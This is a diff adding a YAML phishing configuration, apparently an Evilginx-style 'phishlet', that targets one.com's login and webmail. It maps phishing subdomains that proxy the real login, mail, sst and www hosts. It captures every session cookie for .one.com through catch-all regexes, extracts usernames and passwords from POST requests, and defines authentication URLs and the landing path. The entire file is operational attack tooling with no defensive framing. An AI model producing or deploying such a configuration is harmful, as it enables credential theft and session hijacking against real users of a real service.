@@ -1,0 +1,84 @@
+min_ver: "3.0.0"
+# redirect_url: "https://login.one.com/"
+
+proxy_hosts:
+  - {
+      phish_sub: "login",
+      orig_sub: "login",
+      domain: "one.com",
+      session: true,
+      is_landing: true,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "mail1",
+      orig_sub: "mail",
+      domain: "one.com",
+      session: true,
+      #testing auto filter here
+      auto_filter: true,
+  
+    }
+  # - {
+  #     phish_sub: "login-static",
+  #     orig_sub: "login-static",
+  #     domain: "cdn-one.com",
+  #     session: true,
+  
+  #   }
+  - {
+      phish_sub: "mail",
+      orig_sub: "mail",
+      domain: "login.one.com",
+      session: true,
+      auto_filter: true,
+    }
+
+  - {
+      phish_sub: "sst",
+      orig_sub: "sst",
+      domain: "one.com",
+      session: true,
+      auto_filter: true,
+    }
+  - {
+      phish_sub: "www",
+      orig_sub: "www",
+      domain: "one.com",
+      session: true,
+      auto_filter: true,
+    }
+
+# 
+auth_tokens:
+  # Capture One.com session cookies (common patterns)
+  - domain: ".one.com"
+    keys: ['.*:regexp']
+    type: "cookie"
+  - domain: ".login.one.com"
+    keys: ['.*:regexp']
+    type: "cookie"
+
+credentials:
+  username:
+    key: "username|displayUsername"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+
+
+auth_urls:
+  - "/mail"
+  - "/dashboard"
+  - "/home"
+  - "/api/session"
+  - "/success"
+
+login:
+  domain: "login.one.com"
+  path: "/mail"
+
+
